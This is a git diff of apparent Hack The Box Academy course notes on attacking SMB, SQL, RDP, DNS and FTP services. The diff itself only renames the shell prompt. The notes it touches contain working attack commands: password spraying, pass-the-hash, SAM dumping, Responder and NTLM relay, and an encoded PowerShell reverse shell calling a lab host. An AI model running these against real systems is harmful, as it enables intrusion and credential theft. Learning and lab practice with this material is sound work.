@@ -351,8 +351,8 @@ Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo mkdir /mnt/Finance
-AbdulrahmanTamim@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+root@htb[/htb]$ sudo mkdir /mnt/Finance
+root@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
 ```
 
 As an alternative, we can use a credential file.
@@ -360,7 +360,7 @@ As an alternative, we can use a credential file.
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+root@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
 ```
 
 The file `credentialfile` has to be structured like this:
@@ -384,7 +384,7 @@ Once a shared folder is mounted, you can use common Linux tools such as `find` o
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ find /mnt/Finance/ -name *cred*
+root@htb[/htb]$ find /mnt/Finance/ -name *cred*
 
 /mnt/Finance/Contracts/private/credentials.txt
 ```
@@ -394,7 +394,7 @@ Next, let's find files that contain the string `cred`:
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
+root@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
 
 /mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
 /mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
@@ -417,7 +417,7 @@ We can use a mail client such as [Evolution](https://wiki.gnome.org/Apps/Evoluti
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get install evolution
+root@htb[/htb]$ sudo apt-get install evolution
 ...SNIP...
 ```
 
@@ -460,7 +460,7 @@ To interact with [MSSQL (Microsoft SQL Server)](https://www.microsoft.com/en-us/
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123
+root@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123
 ```
 
 The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
@@ -489,7 +489,7 @@ To interact with [MySQL](https://en.wikipedia.org/wiki/MySQL), we can use MySQL 
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
+root@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
 ```
 
 We can easily start an interactive SQL Session using Windows:
@@ -513,7 +513,7 @@ To install [dbeaver](https://github.com/dbeaver/dbeaver) using a Debian package 
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
+root@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
 ```
 
 To start the application use:
@@ -523,7 +523,7 @@ To start the application use:
 &#x20; Interacting with Common Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ dbeaver &
+root@htb[/htb]$ dbeaver &
 ```
 
 To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).
@@ -928,7 +928,7 @@ This FTP service uses an HTTP `POST` request to upload files. However, the CoreF
 **CoreFTP Exploitation**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+root@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
 
 We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.
@@ -984,7 +984,7 @@ Depending on the SMB implementation and the operating system, we will get differ
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
+root@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
 Nmap scan report for 10.129.14.128
@@ -1030,7 +1030,7 @@ Using `smbclient`, we can display a list of the server's shares with the option 
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbclient -N -L //10.129.14.128
+root@htb[/htb]$ smbclient -N -L //10.129.14.128
 
         Sharename       Type      Comment
         -------      --     -------
@@ -1046,7 +1046,7 @@ SMB1 disabled no workgroup available
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -H 10.129.14.128
+root@htb[/htb]$ smbmap -H 10.129.14.128
 
 [+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
         Disk                                                    Permissions     Comment
@@ -1062,7 +1062,7 @@ Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the dire
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
+root@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
 
 [+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
         Disk                                                    Permissions     Comment
@@ -1084,7 +1084,7 @@ From the above example, the permissions are set to `READ` and `WRITE`, which one
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
+root@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
 
 [+] Starting download: notes\note.txt (116 bytes)
 [+] File output to: /htb/10.129.14.128-notes_note.txt
@@ -1093,7 +1093,7 @@ AbdulrahmanTamim@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+root@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 
 [+] Starting upload: test.txt (20 bytes)
 [+] Upload complete.
@@ -1108,7 +1108,7 @@ The `rpcclient` tool offers us many different commands to execute specific funct
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rpcclient -U'%' 10.10.110.17
+root@htb[/htb]$ rpcclient -U'%' 10.10.110.17
 
 rpcclient $> enumdomusers
 
@@ -1133,7 +1133,7 @@ The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written i
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
+root@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
 
 ENUM4LINUX - next generation
 
@@ -1191,7 +1191,7 @@ With CrackMapExec (CME), we can target multiple IPs, using numerous users and pa
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /tmp/userlist.txt
+root@htb[/htb]$ cat /tmp/userlist.txt
 
 Administrator
 jrodriguez 
@@ -1203,7 +1203,7 @@ jurena
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+root@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
@@ -1259,7 +1259,7 @@ To use `impacket-psexec`, we need to provide the domain/username, the password, 
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-psexec -h
+root@htb[/htb]$ impacket-psexec -h
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1308,7 +1308,7 @@ To connect to a remote machine with a local administrator account, using `impack
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+root@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1338,7 +1338,7 @@ Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantag
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+root@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
@@ -1355,7 +1355,7 @@ Imagine we are in a network with multiple machines. Some of them share the same 
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+root@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
@@ -1379,7 +1379,7 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+root@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
@@ -1400,7 +1400,7 @@ If we manage to get an NTLM hash of a user, and if we cannot crack it, we can st
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+root@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
@@ -1417,7 +1417,7 @@ Let's illustrate an example to understand better how `Responder` works. Imagine 
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ responder -I <interface name>
+root@htb[/htb]$ responder -I <interface name>
 ```
 
 When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
@@ -1433,7 +1433,7 @@ Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\m
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo responder -I ens33
+root@htb[/htb]$ sudo responder -I ens33
 
                                          __               
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -1514,7 +1514,7 @@ Note: If you notice multiples hashes for one account this is because NTLMv2 util
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -1555,7 +1555,7 @@ First, we need to set SMB to `OFF` in our responder configuration file (`/etc/re
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
+root@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
 
 SMB = Off
 ```
@@ -1565,7 +1565,7 @@ Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+root@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1602,13 +1602,13 @@ We can create a PowerShell reverse shell using [https://www.revshells.com/](http
 &#x20; Attacking SMB
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
+root@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
 ```
 
 Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 9001
+root@htb[/htb]$ nc -lvnp 9001
 
 listening on [any] 9001 ...
 connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471
@@ -1681,7 +1681,7 @@ By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
+root@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
 
 Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
@@ -1771,7 +1771,7 @@ Let's imagine we gained access to a SQL Database. First, we need to identify exi
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+root@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
 
 Welcome to the MariaDB monitor. Commands end with ; or \g.
 Your MySQL connection id is 8
@@ -1801,7 +1801,7 @@ If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to 
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+root@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
 Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
@@ -1815,7 +1815,7 @@ Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+root@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1839,7 +1839,7 @@ When using Windows Authentication, we need to specify the domain name or the hos
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+root@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
 Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
@@ -2214,7 +2214,7 @@ If the service account has access to our server, we will obtain its hash. We can
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo responder -I tun0
+root@htb[/htb]$ sudo responder -I tun0
 
                                          __               
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -2235,7 +2235,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo responder -I tun0
 &#x20; Attacking SQL Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+root@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Config file parsed
@@ -2423,7 +2423,7 @@ By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the availabl
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# nmap -Pn -p3389 192.168.2.143 
+root@htb[/htb]# nmap -Pn -p3389 192.168.2.143 
 
 Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
@@ -2447,7 +2447,7 @@ Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a pa
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# cat usernames.txt 
+root@htb[/htb]# cat usernames.txt 
 
 root
 test
@@ -2462,7 +2462,7 @@ administrator
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+root@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 
 2022-04-07 15:35:50 START
 2022-04-07 15:35:50 Crowbar v0.4.1
@@ -2478,7 +2478,7 @@ We can also use `Hydra` to perform an RDP password spray attack.
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+root@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -2500,7 +2500,7 @@ We can RDP into the target system using the `rdesktop` client or `xfreerdp` clie
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
+root@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
 
 Autoselecting keyboard map 'en-us' from locale
 
@@ -2609,7 +2609,7 @@ Once the registry key is added, we can use `xfreerdp` with the option `/pth` to 
 &#x20; Attacking RDP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+root@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 
 [09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
 [09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
@@ -2701,7 +2701,7 @@ The Nmap `-sC` (default scripts) and `-sV` (version scan) options can be used to
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213
+root@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
 Nmap scan report for 10.10.110.213
@@ -2724,7 +2724,7 @@ An attacker could leverage this DNS zone transfer vulnerability to learn more ab
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+root@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
 
 ; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
 ;; global options: +cmd
@@ -2747,7 +2747,7 @@ Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enu
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# fierce --domain zonetransfer.me
+root@htb[/htb]# fierce --domain zonetransfer.me
 
 NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
 SOA: nsztm1.digi.ninja. (81.4.108.41)
@@ -2825,7 +2825,7 @@ Before performing a subdomain takeover, we should enumerate subdomains for a tar
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# ./subfinder -d inlanefreight.com -v       
+root@htb[/htb]# ./subfinder -d inlanefreight.com -v       
                                                                        
         _     __ _         _                                           
 ____  _| |__ / _(_)_ _  __| |___ _ _          
@@ -2857,10 +2857,10 @@ An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
-AbdulrahmanTamim@htb[/htb]$ cd subbrute
-AbdulrahmanTamim@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
-AbdulrahmanTamim@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
+root@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+root@htb[/htb]$ cd subbrute
+root@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
+root@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
 
 Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
 inlanefreight.com
@@ -2879,7 +2879,7 @@ The tool has found four subdomains associated with `inlanefreight.com`. Using th
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# host support.inlanefreight.com
+root@htb[/htb]# host support.inlanefreight.com
 
 support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
 ```
@@ -2908,7 +2908,7 @@ To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/et
 &#x20; Attacking DNS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# cat /etc/ettercap/etter.dns
+root@htb[/htb]# cat /etc/ettercap/etter.dns
 
 inlanefreight.com      A   192.168.225.110
 *.inlanefreight.com    A   192.168.225.110
